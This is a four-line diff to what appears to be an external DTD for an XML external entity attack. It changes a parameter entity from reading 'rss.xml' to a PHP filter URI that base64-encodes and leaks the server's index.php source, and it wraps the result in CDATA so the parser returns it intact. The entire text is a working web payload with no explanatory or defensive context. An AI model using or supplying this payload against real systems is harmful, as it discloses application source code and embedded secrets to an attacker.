@@ -1,4 +1,4 @@
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
-<!ENTITY % file SYSTEM "rss.xml">
+<!ENTITY % file PUBLIC "php://filter/convert.base64-encode/resource=index.php">
 <!ENTITY all "%start;%file;%end;">
